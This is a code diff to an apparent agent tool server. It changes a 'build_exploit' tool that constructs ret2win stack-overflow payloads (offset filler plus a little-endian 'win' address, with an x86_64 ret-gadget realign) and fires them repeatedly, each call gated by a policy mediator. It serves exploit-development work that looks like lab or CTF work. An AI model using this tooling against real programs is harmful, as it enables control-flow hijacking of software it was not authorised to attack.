@@ -184,14 +184,11 @@ reg("build_exploit", "Build and verify a ret2win: payload = <offset> filler + ad
   async ({ offset, win_symbol, times }) => {
     const v = mediate("build_exploit", { offset, win_symbol: win_symbol ?? "win", times: times ?? 5 });
     if (v.decision !== "allow") return deny(v);
-    const sym = await sess("symbol", { name: win_symbol ?? "win" });
-    if (sym.error) return { content: [{ type: "text", text: JSON.stringify(sym) }] };
-    // payload = offset filler + little-endian 8-byte win address
-    const addr = BigInt(sym.addr);
-    const le = Buffer.alloc(8); le.writeBigUInt64LE(addr);
-    const payload = Buffer.concat([Buffer.alloc(offset, 0x41), le]);
-    const r = await sess("exploit", { payload_hex: payload.toString("hex"), times: times ?? 5, marker: v.marker?.hmac });
-    return { content: [{ type: "text", text: JSON.stringify({ win: sym.addr_hex, offset, ...r }, null, 2) }] };
+    // Arch-aware payload build (adds a ret-gadget realign on x86_64; none on aarch64).
+    const built = await sess("ret2win_payload", { offset, win_symbol: win_symbol ?? "win" });
+    if (built.error) return { content: [{ type: "text", text: JSON.stringify(built) }] };
+    const r = await sess("exploit", { payload_hex: built.payload_hex, times: times ?? 5, marker: v.marker?.hmac });
+    return { content: [{ type: "text", text: JSON.stringify({ win: built.win, offset, arch: built.arch, realign: built.realign, ...r }, null, 2) }] };
   });
 
 // ---- custody: develop-side of the discovery->develop handoff ----
